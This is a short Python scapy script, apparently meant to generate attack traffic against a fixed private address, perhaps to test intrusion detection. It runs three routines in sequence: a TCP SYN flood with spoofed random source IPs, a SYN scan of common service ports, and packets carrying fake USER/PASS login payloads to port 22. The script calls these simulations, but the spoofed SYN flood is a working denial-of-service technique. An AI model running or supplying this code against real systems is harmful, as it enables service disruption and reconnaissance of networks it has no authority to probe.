from scapy.all import *
import time
import random

# Target settings
TARGET_IP = "192.168.18.3"  # Change this to the actual target IP
PORTS_TO_SCAN = [21, 22, 23, 80, 443, 3306, 3389]  # Common attack targets

# Simulate a DDoS Attack (TCP SYN Flood)
def ddos_attack(target_ip, target_port):
    print("[⚠️] Launching DDoS Attack...")
    for _ in range(100):  # Sends 100 packets rapidly
        ip_layer = IP(src=f"192.168.1.{random.randint(2, 254)}", dst=target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)
    print("[✅] DDoS Attack Sent!")

# Simulate a Port Scanning Attack
def port_scan(target_ip, ports):
    print("[⚠️] Scanning Ports...")
    for port in ports:
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(dport=port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)
    print("[✅] Port Scan Completed!")

# Simulate a Brute Force Attack (Multiple login attempts)
def brute_force_attack(target_ip, target_port):
    print("[⚠️] Simulating Brute Force Attack...")
    for _ in range(50):  # Simulate 50 fake login attempts
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(dport=target_port, flags="PA")  # Push/Acknowledge flags (Data packet)
        fake_login = Raw(load=f"USER attacker{random.randint(1,100)}\r\nPASS fakepassword\r\n")
        packet = ip_layer / tcp_layer / fake_login
        send(packet, verbose=False)
    print("[✅] Brute Force Attack Simulated!")

# Run the attacks
if __name__ == "__main__":
    time.sleep(3)
    ddos_attack(TARGET_IP, 80)         # Targeting HTTP port for DDoS
    time.sleep(2)
    port_scan(TARGET_IP, PORTS_TO_SCAN)  # Scanning multiple ports
    time.sleep(2)
    brute_force_attack(TARGET_IP, 22)  # Targeting SSH login brute force
